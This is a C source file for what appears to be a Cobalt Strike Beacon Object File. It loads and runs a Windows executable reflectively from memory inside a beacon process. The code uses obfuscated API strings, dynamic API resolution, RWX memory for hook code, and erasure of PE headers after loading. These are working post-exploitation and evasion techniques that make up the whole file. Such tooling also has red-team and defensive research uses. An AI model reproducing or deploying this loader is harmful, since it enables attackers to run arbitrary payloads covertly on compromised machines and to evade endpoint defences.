#ifdef _DEBUG
#define xorstr_(s) s
#else
#include "xorstr.hpp"
#endif

extern "C" {
#include "inlinecommon.hpp"

#include "ReflectiveLoaderEx.c"
#include "globalshareddata.c"
#include "simplelist1.c"

WINBASEAPI NTSTATUS NTAPI NtFlushInstructionCache(HANDLE ProcessHandle,
                                                  PVOID BaseAddress,
                                                  ULONG NumberOfBytesToFlush);

#ifdef _WIN64
#ifdef _DEBUG
#include "hooks_x64d_exe.h"
#define HOOKS_EXE HOOKS_X64D_EXE
#else
#include "hooks_x64_exe.h"
#define HOOKS_EXE HOOKS_X64_EXE
#endif
#else
#ifdef _DEBUG
#include "hooks_x86d_exe.h"
#define HOOKS_EXE HOOKS_X86D_EXE
#else
#include "hooks_x86_exe.h"
#define HOOKS_EXE HOOKS_X86_EXE
#endif
#endif

// TODO: Add proxy dll loading https://github.com/kleiton0x00/Proxy-DLL-Loads
HMODULE GetOrLoadDll(LPCSTR dllName) {
  HMODULE handle = GetModuleHandleA(dllName);
  if (handle)
    return handle;
  handle = LoadLibraryA(dllName);
  TRACEF("LoadLibraryA(%s): %p", dllName, handle);
  return handle;
}

#define GetOrLoadDll2(m) GetOrLoadDll(xorstr_(m))
#define GetProcAddress2(m, f) ((PVOID)GetProcAddress(m, xorstr_(f)))

#include "jobs1.c"
#include "jobs2.c"
#include "seh.c"

void ImportHookApis(HookContext *ctx) {
  // clang-format off
  HMODULE kernel32                        = GetOrLoadDll2("kernel32.dll");
  ctx->_AddVectoredContinueHandler        = GetProcAddress2(kernel32, "AddVectoredContinueHandler");
  ctx->_AddVectoredExceptionHandler       = GetProcAddress2(kernel32, "AddVectoredExceptionHandler");
  ctx->_CloseHandle                       = GetProcAddress2(kernel32, "CloseHandle");
  ctx->_CreateEventA                      = GetProcAddress2(kernel32, "CreateEventA");
  ctx->_CreatePipe                        = GetProcAddress2(kernel32, "CreatePipe");
  ctx->_CreateThread                      = GetProcAddress2(kernel32, "CreateThread");
  ctx->_ExitThread                        = GetProcAddress2(kernel32, "ExitThread");
  ctx->_GetModuleHandleA                  = GetProcAddress2(kernel32, "GetModuleHandleA");
  ctx->_GetProcAddress                    = GetProcAddress2(kernel32, "GetProcAddress");
  ctx->_GetStdHandle                      = GetProcAddress2(kernel32, "GetStdHandle");
  ctx->_GetThreadId                       = GetProcAddress2(kernel32, "GetThreadId");
  ctx->_MultiByteToWideChar               = GetProcAddress2(kernel32, "MultiByteToWideChar");
  ctx->_OpenThread                        = GetProcAddress2(kernel32, "OpenThread");
  ctx->_Process32NextW                    = GetProcAddress2(kernel32, "Process32NextW");
  ctx->_ReadFile                          = GetProcAddress2(kernel32, "ReadFile");
  ctx->_RemoveVectoredContinueHandler     = GetProcAddress2(kernel32, "RemoveVectoredContinueHandler");
  ctx->_RemoveVectoredExceptionHandler    = GetProcAddress2(kernel32, "RemoveVectoredExceptionHandler");
  ctx->_SetEvent                          = GetProcAddress2(kernel32, "SetEvent");
  ctx->_SetUnhandledExceptionFilter       = GetProcAddress2(kernel32, "SetUnhandledExceptionFilter");
  ctx->_Sleep                             = GetProcAddress2(kernel32, "Sleep");
  ctx->_TerminateThread                   = GetProcAddress2(kernel32, "TerminateThread");
  ctx->_TlsAlloc                          = GetProcAddress2(kernel32, "TlsAlloc");
  ctx->_TlsFree                           = GetProcAddress2(kernel32, "TlsFree");
  ctx->_VirtualAlloc                      = GetProcAddress2(kernel32, "VirtualAlloc");
  ctx->_VirtualFree                       = GetProcAddress2(kernel32, "VirtualFree");
  ctx->_WaitForSingleObject               = GetProcAddress2(kernel32, "WaitForSingleObject");
  ctx->_WideCharToMultiByte               = GetProcAddress2(kernel32, "WideCharToMultiByte");
  ctx->_WriteFile                         = GetProcAddress2(kernel32, "WriteFile");
  HMODULE msvcrt                          = GetOrLoadDll2("msvcrt.dll");
  ctx->__beginthread                      = GetProcAddress2(msvcrt, "_beginthread");
  ctx->__vscprintf                        = GetProcAddress2(msvcrt, "_vscprintf");
  ctx->_free                              = GetProcAddress2(msvcrt, "free");
  ctx->_malloc                            = GetProcAddress2(msvcrt, "malloc");
  ctx->_memcpy                            = GetProcAddress2(msvcrt, "memcpy");
  ctx->_realloc                           = GetProcAddress2(msvcrt, "realloc");
  ctx->_vsprintf_s                        = GetProcAddress2(msvcrt, "vsprintf_s");
#ifdef _WIN64
  ctx->_RtlDeleteFunctionTable            = GetProcAddress2(kernel32, "RtlDeleteFunctionTable");
#endif
#ifdef _DEBUG
  ctx->_OutputDebugStringA                = GetProcAddress2(kernel32, "OutputDebugStringA");
#endif
#ifndef BOF
  ctx->_free                              = (PVOID)free;
  ctx->_malloc                            = (PVOID)malloc;
  ctx->_realloc                           = (PVOID)realloc;
#endif
  // clang-format on
  PVOID *apis = &ctx->_AddVectoredContinueHandler;
  int apiCount = (int)(&ctx->MyGetProcAddress - apis);
  for (int i = 0; i < apiCount; i++) {
    TRACEF("Api[%d]: %p", i, apis[i]);
    if (!apis[i])
      PRINTF_ERR("Api[%d] is NULL.", i);
  }
}

HookResult InlineExecutePE(HookFeatures features, void *stdin_, int stdinSize,
                           void *peImage, int peImageSize, char *commandLineA,
                           int commandLineASize, int jobVersion,
                           HANDLE hCompletionEvent, void **loadedImageBase) {
  TRACEF("Begin run pe.");

  HookContext *hookCtx = NULL;
  PVOID hookBase = NULL;
  HookControlEntryProc hookControlEntry = NULL;
  WCHAR *commandLineW = NULL;
  int commandLineWSize = 0;
  int outputType = 0;
  JobEntry **jobList = NULL;
  int jobId = 0;
  HANDLE hJobWritePipe = NULL;
  HookOutput *output = NULL;
  HookResult result = HookResultSuccess;
  DWORD imageSize = 0;
  PVOID imageBase = NULL;
  PVOID entryPoint = NULL;
  GlobalSharedData *sharedData = NULL;
  int index = 0;
  LoadedPEImage *loadedPEImage = NULL;

  // Check the architecture of the PE image
  if (((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                           ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
          ->FileHeader.Machine != (sizeof(PVOID) == 4
                                       ? IMAGE_FILE_MACHINE_I386
                                       : IMAGE_FILE_MACHINE_AMD64)) {
    PRINTF_ERR("The architecture of the PE image to be loaded does not match "
               "the current process.");
    result = HookResultErrorInvalidArgument;
    goto err;
  }

  /*
   * 1. Prepare hook
   */

  TRACEF("1. Prepare hook");

  hookCtx = (HookContext *)malloc(sizeof(HookContext));
  if (!hookCtx) {
    PRINTF_ERR("Failed to allocate hooks context.");
    goto err;
  }
  memset(hookCtx, 0, sizeof(HookContext));
  hookCtx->Features = features;
  hookCtx->CompletionEventHandle = hCompletionEvent;
  ImportHookApis(hookCtx);
#ifdef HOOKS_DLL
  hookControlEntry = (HookControlEntryProc)GetProcAddress2(
      GetOrLoadDll2("hooks.dll"), "__HookControlEntry");
#else
  hookBase = VirtualAlloc(NULL, sizeof(HOOKS_EXE), MEM_RESERVE | MEM_COMMIT,
                          PAGE_EXECUTE_READWRITE);
  // TODO: allocate then set RWX, add padding before and after code.
  if (!hookBase) {
    PRINTF_ERR("Failed to allocate hooks code.");
    goto err;
  }
  memcpy(hookBase, HOOKS_EXE, sizeof(HOOKS_EXE));
  hookCtx->HookBase = hookBase;
  hookControlEntry = (HookControlEntryProc)hookBase;
#endif
  if ((hookCtx->Features & HookFeatureCommandLine) && commandLineA) {
    commandLineWSize = commandLineASize * 2;
    commandLineW = (WCHAR *)malloc(commandLineWSize);
    if (!commandLineW ||
        !toWideChar(commandLineA, commandLineW, commandLineWSize)) {
      PRINTF_ERR("Failed to allocate commandLineW.");
      goto err;
    }
    commandLineWSize = 0;
    while (commandLineW[commandLineWSize++] != L'\0')
      ;
    commandLineWSize *= 2;
  } else {
    commandLineWSize = 0;
    commandLineW = NULL;
  }

  /*
   * 2. Initialize hook
   */

  TRACEF("2. Initialize hook");

  outputType =
      (features & HookFeatureCpp) ? CALLBACK_OUTPUT : CALLBACK_OUTPUT_UTF8;
  if (jobVersion) {
    if (SimpleAddJob(jobVersion, outputType, commandLineA, &jobList, &jobId,
                     &hJobWritePipe)) {
      hookCtx->JobOutputWriteHandle = hJobWritePipe;
      hookCtx->JobOutputLock = 0;
      TRACEF("Job %d was added. Never use 'jobkill' for this PE image!", jobId);
    } else
      PRINTF_ERR("Failed to add job. Fall back to normal async log. Use "
                 "'inline-log-pe' to fetch logs manually.");
  }

  output = (HookOutput *)malloc(sizeof(HookOutput));
  if (!output) {
    PRINTF_ERR("Failed to allocate hook output.");
    goto err;
  }
  memset(output, 0, sizeof(HookOutput));
  if (!SimpleListAlloc(&output->Logs, sizeof(LogEntry) * 64)) {
    PRINTF_ERR("Failed to allocate hook log list.");
    goto err;
  }
  output->Type = outputType;
  hookCtx->Output = output;

  result = hookControlEntry(HookControlCreate, hookCtx, stdin_, stdinSize,
                            commandLineA, commandLineASize, commandLineW,
                            commandLineWSize);
  switch (result) {
  case HookResultSuccess:
    break;
  case HookResultErrorCreateCommandLine:
    PRINTF_ERR("Failed to allocate command-line.");
    goto err;
  case HookResultErrorCreatePipeServers:
    PRINTF_ERR("Failed to create pipe servers to redirect stdio.");
    goto err;
  case HookResultErrorCreateNewThreadList:
    PRINTF_ERR("Failed to allocate new thread list.");
    goto err;
  case HookResultErrorCreateExceptionHandlerList:
    PRINTF_ERR("Failed to allocate exception handler list.");
    goto err;
  case HookResultErrorCreateMemoryList:
    PRINTF_ERR("Failed to allocate memory list.");
    goto err;
  case HookResultErrorCreateTlsList:
    PRINTF_ERR("Failed to allocate tls list.");
    goto err;
  case HookResultErrorCreateKernel32Base:
    PRINTF_ERR("Failed to get kernel32.dll image base.");
    goto err;
  default:
    PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
               result);
    goto err;
  }

  /*
   * 3. Load PE image from memory
   */

  TRACEF("3. Load PE image from memory");

  imageSize = ((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                                   ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
                  ->OptionalHeader.SizeOfImage;
  imageBase = peImage;
  entryPoint = ReflectiveLoaderEx(
      &imageBase, (PVOID)LoadLibraryA, hookCtx->MyGetProcAddress,
      (PVOID)VirtualAlloc, (PVOID)NtFlushInstructionCache,
      hookCtx->Features & HookFeatureCppSEH);
  hookCtx->ImageBase = imageBase;
  TRACEF("ReflectiveLoaderEx done.");
  if (hookCtx->Features & HookFeatureCppSEH) {
#ifdef _WIN64
    hookCtx->FunctionTable = EnableSEH(imageBase);
#else
    hookCtx->SEH_ImageBase = EnableSEH(imageBase);
#endif
    TRACEF("SEH was enabled.");
    // Zero PE headers
    memset(peImage, 0,
           ((PIMAGE_NT_HEADERS)((PBYTE)peImage +
                                ((PIMAGE_DOS_HEADER)peImage)->e_lfanew))
               ->OptionalHeader.SizeOfHeaders);
  }
  PRINTF("PE image was loaded. (imageBase: %p, imageSize: %x, entryPoint: %p)",
         imageBase, (UINT)imageSize, entryPoint);
  sharedData = GetGlobalSharedData();
  for (index = 0; index < LoadedPEImageMax; index++) {
    if (!sharedData->PEImages[index].ImageBase)
      break;
  }
  if (index == LoadedPEImageMax) {
    PRINTF_ERR("Too many loaded PE images. Can't add to PEImages.");
    goto err;
  }
  loadedPEImage = &sharedData->PEImages[index];
  loadedPEImage->ImageBase = imageBase;
  loadedPEImage->HookContext = hookCtx;
  loadedPEImage->IsRunning = FALSE;
  loadedPEImage->JobList = jobList;
  loadedPEImage->JobId = jobId;
  loadedPEImage->Output = output;
  sharedData->LastImageBase = imageBase;
  hookCtx->PEImage = loadedPEImage;
  if (loadedImageBase)
    *loadedImageBase = imageBase;
  TRACEF("PE image %p was added to global shared data index %d.", imageBase,
         index);

  /*
   * 4. Call exe entrypoint
   */

  TRACEF("4. Call exe entrypoint");

  result = hookControlEntry(HookControlStart, entryPoint);
  switch (result) {
  case HookResultSuccess:
    break;
  case HookResultErrorStartNewThread:
    PRINTF_ERR("Failed to create new thread to run exe entry-point.");
    goto err;
  default:
    PRINTF_ERR("Failed to call HookControlEntry(HookControlCreate): %x",
               result);
    goto err;
  }
  loadedPEImage->IsRunning = TRUE;
  TRACEF("Thread of exe entry-point was created.");
  goto out;

err:
  if (imageBase) {
    if (hookCtx->Features & HookFeatureCppSEH) {
#ifdef _WIN64
      RtlDeleteFunctionTable((PRUNTIME_FUNCTION)hookCtx->FunctionTable);
#else
      *(PVOID *)hookCtx->SEH_ImageBase = NULL;
#endif
    }
    VirtualFree(imageBase, 0, MEM_RELEASE);
  }
  if (output) {
    SimpleListForEach(&output->Logs, LogEntry, log, free(log->Text));
    SimpleListFree(&output->Logs);
    free(output);
  }
  if (jobList)
    SimpleRemoveJob(jobList, jobId);
#ifndef HOOKS_DLL
  if (hookBase)
    VirtualFree(hookBase, 0, MEM_RELEASE);
#endif
  if (hookCtx)
    free(hookCtx);
out:
  if (commandLineW)
    free(commandLineW);

  TRACEF("End run pe.");

  return result;
}

#ifdef BOF
void go(char *argv, int argc) {
  // Parse arguments
  datap parser;
  BeaconDataParse(&parser, argv, argc);
  HookFeatures features = (HookFeatures)BeaconDataInt(&parser);
  int stdinSize = 0;
  void *stdin_ = BeaconDataExtract(&parser, &stdinSize);
  int peImageSize = 0;
  void *peImage = BeaconDataExtract(&parser, &peImageSize);
  int commandLineASize = 0;
  char *commandLineA = BeaconDataExtract(&parser, &commandLineASize);
  int jobVersion = BeaconDataInt(&parser);
  TRACEF("Arguments was parsed. (features: %x, stdin: %p (%d bytes), peImage: "
         "%p (%d bytes), commandLineA: %s (%d bytes), jobVersion: %d)",
         features, stdin_, stdinSize, peImage, peImageSize, commandLineA,
         commandLineASize, jobVersion);

  InlineExecutePE(features, stdin_, stdinSize, peImage, peImageSize,
                  commandLineA, commandLineASize, jobVersion, NULL, NULL);
}
#endif
}
